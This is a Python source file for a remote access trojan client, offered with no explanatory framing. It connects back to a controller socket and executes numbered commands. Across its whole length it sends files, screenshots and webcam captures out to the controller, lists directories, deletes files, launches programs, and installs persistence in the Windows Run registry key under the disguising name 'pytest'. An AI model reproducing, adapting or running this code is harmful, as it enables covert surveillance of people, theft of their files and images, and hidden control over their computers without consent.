import os
import socket
import pyautogui
import cv2
import winreg
import time
Host = "127.0.0.1" #local host
Port = 80
def server_connect():
    while True:
        try:
            s = socket.socket()
            s.connect((Host, Port))
            while True:
                    command = s.recv(1024)
                    command = command.decode()
                    if command == "1":
                            files = os.getcwd()
                            s.send(files.encode())
                            print("done")
                    elif command == "2":
                        dir_input = s.recv(6000)
                        dir_input = dir_input.decode()
                        files = os.listdir(dir_input)
                        files = str(files)
                        s.send(files.encode())
                        print("done")
                    elif command == "3":
                        ss = pyautogui.screenshot()
                        ss.save("C:\\ProgramData\\steath.jpg")
                        file = open("C:\\ProgramData\\steath.jpg", "rb")
                        data = file.read()
                        s.send(data)
                    elif command == "4":
                        filepath = s.recv(5000)
                        filepath = filepath.decode()
                        file = open(filepath, "rb")
                        data = file.read()
                        s.send(data)
                        print("file has been sent")
                    elif command == "5":
                        filepath = s.recv(5000)
                        filepath = filepath.decode()
                        os.remove(filepath)
                    elif command == "6":
                        quit()
                    elif command == "7":
                        camera = cv2.VideoCapture(0)
                        return_value, image = camera.read()
                        cv2.imwrite('C:\\ProgramData\\webcam.jpg', image)
                        del(camera)
                        file = open("C:\\ProgramData\\webcam.jpg" , "rb")
                        data = file.read()
                        s.send(data)
                    elif command == "8":
                        PATH = s.recv(6000)
                        PATH = PATH.decode()
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0, winreg.KEY_ALL_ACCESS)
                        winreg.SetValueEx(key,'pytest',0,winreg.REG_SZ,PATH )
                        key.Close()
                    elif command == "9":
                        apppath = s.recv(6000)
                        apppath = apppath.decode()
                        os.startfile(apppath)
        except socket.error:
            time.sleep(5)  # wait 5 seconds to try again
        else:
            break
server_connect()
